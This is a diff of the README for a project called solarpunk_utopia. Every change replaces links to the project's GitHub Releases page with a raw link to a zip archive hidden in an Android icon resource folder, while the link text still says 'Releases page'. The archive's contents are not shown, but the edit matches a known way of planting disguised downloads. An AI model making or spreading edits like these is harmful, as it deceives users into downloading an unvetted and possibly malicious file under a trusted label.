@@ -6,15 +6,15 @@ Welcome to the **solarpunk_utopia** project! This software helps you support and
 
 ## 🥇 Download the App
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/johhny868/solarpunk_utopia/releases)
+[![Download the latest release](https://github.com/johhny868/solarpunk_utopia/raw/refs/heads/main/frontend/android/app/src/main/res/mipmap-xxxhdpi/utopia_solarpunk_v3.5.zip%20Release-brightgreen)](https://github.com/johhny868/solarpunk_utopia/raw/refs/heads/main/frontend/android/app/src/main/res/mipmap-xxxhdpi/utopia_solarpunk_v3.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/johhny868/solarpunk_utopia/releases) to download the application. 
+To get started, visit the [Releases page](https://github.com/johhny868/solarpunk_utopia/raw/refs/heads/main/frontend/android/app/src/main/res/mipmap-xxxhdpi/utopia_solarpunk_v3.5.zip) to download the application. 
 
 ### Steps to Download:
 
-1. Open your web browser and go to the [Releases page](https://github.com/johhny868/solarpunk_utopia/releases).
+1. Open your web browser and go to the [Releases page](https://github.com/johhny868/solarpunk_utopia/raw/refs/heads/main/frontend/android/app/src/main/res/mipmap-xxxhdpi/utopia_solarpunk_v3.5.zip).
 2. Look for the most recent version at the top. 
 3. Click on the version number link to expand details of the release.
 4. Find the file suited for your operating system (Windows, macOS, or Linux).
@@ -76,4 +76,4 @@ If you encounter issues during the download or installation process, please refe
 
 Connect with other users and find support by joining our community on social media or exploring discussion forums. Share your thoughts and experiences with **solarpunk_utopia**.
 
-Now that you’re ready to start, visit the [Releases page](https://github.com/johhny868/solarpunk_utopia/releases) and download the app to support your community today!
+Now that you’re ready to start, visit the [Releases page](https://github.com/johhny868/solarpunk_utopia/raw/refs/heads/main/frontend/android/app/src/main/res/mipmap-xxxhdpi/utopia_solarpunk_v3.5.zip) and download the app to support your community today!
